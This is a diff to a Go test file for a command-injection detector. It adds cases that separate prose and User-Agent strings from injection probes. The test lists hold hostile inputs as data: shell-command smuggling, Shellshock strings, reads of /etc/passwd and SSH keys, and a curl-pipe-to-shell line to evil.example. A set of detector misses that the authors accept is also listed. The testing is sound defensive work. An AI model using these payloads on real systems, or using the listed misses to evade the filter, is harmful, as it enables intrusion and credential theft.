@@ -409,6 +409,14 @@ func TestCmdISleepPrefix(t *testing.T) {
 		"foo%3B%20sleep%2010",
 		"Mon%3B%20sleep%208",
 		"Mon%3b sleep 8",
+		// alpha.6: a value that is one ASCII letter or a number before
+		// "; " is a probe, not a note. This was an accepted miss in alpha.5.
+		"1; sleep 5",
+		"x; sleep 10",
+		"x;  sleep 10",
+		"x; sleep  10",
+		"42; sleep 10",
+		"a; sleep 5",
 	})
 	assertNoHits(t, "CmdI", CmdI, []string{
 		"Mon; sleep 8",
@@ -416,13 +424,12 @@ func TestCmdISleepPrefix(t *testing.T) {
 		"Good night; sleep 8",
 		"Tired & sleep 8",
 		"Café; sleep 8",
-		// Accepted trade-off: one plain token then "; sleep N" at the end
-		// reads like "Mon; sleep 8", so these are clean. An extra blank
-		// does not change the verdict. "1;sleep 5" (no blank) is a hit.
-		"1; sleep 5",
-		"x; sleep 10",
-		"x;  sleep 10",
-		"x; sleep  10",
+		// A word or a word and number before "; sleep N" reads like a
+		// note. A one-letter or all-digit value before it is a probe (above).
+		"Mo; sleep 8",
+		"Room 5; sleep 8",
+		"2 kids; sleep 8",
+		"Night; sleep 9",
 	})
 	// Other commands keep their rules after a one-word prefix.
 	assertHits(t, "CmdI", CmdI, want, []string{
@@ -477,6 +484,128 @@ func TestCmdIVariants(t *testing.T) {
 			t.Errorf("ScanText(%q) = %+v, want no %s (literal line break is prose)", v, hits, want.RuleID)
 		}
 	}
+}
+
+// TestCmdIAlpha6Prose covers the alpha.6 false positives: a two-letter
+// locale token in a User-Agent comment, a word after a dash in "Tea & cat
+// -cozy /club", a single-backtick inline-code span in prose, and a bare
+// command after a line break that follows a prose line in a query value.
+// Each has attack counter-cases that must stay hits.
+func TestCmdIAlpha6Prose(t *testing.T) {
+	want := Hit{RuleID: "AEG-CMDI-001", Category: model.CatCmdi, Severity: model.SeverityCritical}
+	clean := []string{
+		// User-Agent comments: "; id;" and "; id)" are the Indonesian
+		// locale tag, not a command.
+		"Mozilla/5.0 (Linux; U; Android 4.4.2; id; SM-G900 Build/KOT49H) AppleWebKit/534.30 Mobile Safari/534.30",
+		"UCWEB/2.0 (Symbian; U; S60 V3; id; NokiaE63)",
+		"Mozilla/5.0 (BlackBerry; U; BlackBerry 9220; id) AppleWebKit/534.11+ (KHTML, like Gecko) Mobile Safari/534.11+",
+		"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2; U; id) Presto/2.5.25",
+		// A word after a dash, then a one-segment web path.
+		"Tea & cat -cozy /club",
+		"Gifts & cat -cute /shop",
+		// Inline code in prose.
+		"Use `ls` to list files",
+		"Se også: `id`.",
+		"On LoongArch, `uname -m` returns `loongarch64`",
+		"Zie ook: `id`.",
+		"See the `id` command, then `ls` it.",
+		"Send it to the terminal `/dev/tty5`:",
+		"Create a pool using `/var/vms` as the storage",
+		"यह आदेश `id --user --name` का उपनाम है।",
+		"此命令為 `id` 的別名。",
+	}
+	assertNoHits(t, "CmdI", CmdI, clean)
+	for _, v := range clean {
+		if hits := ScanText(v); containsRule(hits, want.RuleID) {
+			t.Errorf("ScanText(%q) = %+v, want no %s", v, hits, want.RuleID)
+		}
+	}
+	hits := []string{
+		"; id",
+		"x; id; ls",
+		"`id`",
+		"x`id`",
+		"$(id)",
+		"a;cat /etc/passwd",
+		"127.0.0.1; ls",
+		"| id",
+		"&& id",
+		"() { :;}; /bin/id",
+		"Mozilla/5.0 () { :;}; /bin/id",
+		// UA-shaped values keep every other command shape.
+		"Mozilla/5.0 (Linux; id -u)",
+		"Mozilla/5.0 (Linux; cat /etc/passwd)",
+		"Mozilla/5.0 (Linux; $(id))",
+		"Mozilla/5.0 (Linux; `id`)",
+		"Mozilla/5.0 (Linux) ; id",
+		"Mozilla/5.0 (Linux);id",
+		"Mozilla/5.0 (Linux; whoami)",
+		"Mozilla/5.0 (Linux;id)",
+		"(Linux; id)",
+		"Mozilla/5.0 (Linux; sleep 10)",
+		"Mozilla/5.0 (Linux%3B id)",
+		// A dashed word does not hide a system path.
+		"Tea & cat -cozy /etc/passwd",
+		"x & cat -cozy ~/.ssh/id_rsa",
+		"x & cat -n /club/x",
+		// Backticks after an operator, glued to a word, with nothing after the
+		// span, or percent-encoded stay command substitution.
+		"x; `id`",
+		"x | `id` now",
+		"x && `id` now",
+		"x = `id` now",
+		"Name `id`",
+		"Use `id`",
+		"Use %60ls%60 to list files",
+		"Use `ls` id",
+		"Use `curl http://evil.example/x | sh` now",
+		"Use `ls`; id",
+		"x\n`id`",
+	}
+	assertHits(t, "CmdI", CmdI, want, hits)
+
+	// Query values: the engine decoded them once, so a line break arrived
+	// encoded. After a prose line ("Dear team") a bare command is prose;
+	// after a single token or a shell-like line it is a hit. Inline code
+	// stays command substitution in a query value.
+	query := Hit{RuleID: "AEG-CMDI-001", Category: model.CatCmdi, Severity: model.SeverityCritical}
+	assertNoHits(t, "cmdIQuery", cmdIQuery, []string{
+		"Dear team\nid",
+		"Dear team,\nls\nThanks",
+		"Dear team\r\nid",
+		"Hello there\n\nid",
+		"Tea & cat -cozy /club",
+		"Mozilla/5.0 (Linux; U; Android 4.4.2; id; SM-G900 Build/KOT49H)",
+	})
+	assertHits(t, "cmdIQuery", cmdIQuery, query, []string{
+		"x\nid",
+		"x\r\nid",
+		"127.0.0.1\nid",
+		"x;\nid",
+		"Dear team\nid -u",
+		"Dear team\ncat /etc/passwd",
+		"Dear team\nid; ls",
+		"Dear team%0aid",
+		"a=b c\nid",
+		"Use `ls` to list files",
+		"Se også: `id`.",
+	})
+}
+
+// TestCmdIAlpha6AcceptedMisses pins the attack shapes alpha.6 lets through
+// to clear the prose above (threat model, "Changes in alpha.6"; corpus
+// README trade-off table). If one starts to hit, update those documents.
+func TestCmdIAlpha6AcceptedMisses(t *testing.T) {
+	assertNoHits(t, "CmdI", CmdI, []string{
+		"Mozilla/5.0 (x; id)",
+		"Mozilla/5.0 (x; ls)",
+		"x & cat -cozy /flag",
+		"a `id` b",
+		"x: `ls`.",
+		"ab; sleep 10",
+		"x 1; sleep 5",
+	})
+	assertNoHits(t, "cmdIQuery", cmdIQuery, []string{"foo bar\nid"})
 }
 
 func TestCodeIPositives(t *testing.T) {
@@ -617,8 +746,13 @@ func TestInjectionAdversarialTime(t *testing.T) {
 		"shock":  strings.Repeat("() {", 2048),
 		"crlf":   strings.Repeat("\r\n", 4096),
 		"codei":  strings.Repeat("<?eval(", 1170),
+		// alpha.6 prose readings: backtick spans, UA comments, prose lines.
+		"ticks":   strings.Repeat("a `", 2730),
+		"ticks2":  "a `" + strings.Repeat("x ", 4096),
+		"uacmt":   "Mozilla/5.0 (" + strings.Repeat("U; id; ", 1170),
+		"proseln": strings.Repeat("Dear team\n", 819),
 	}
-	fns := []func(string) (Hit, bool){CmdI, CodeI, LDAP, SSTI, JNDI, CRLF}
+	fns := []func(string) (Hit, bool){CmdI, cmdIQuery, CodeI, LDAP, SSTI, JNDI, CRLF}
 	if testing.Short() {
 		t.Skip("wall-clock bound; skipped under -short")
 	}
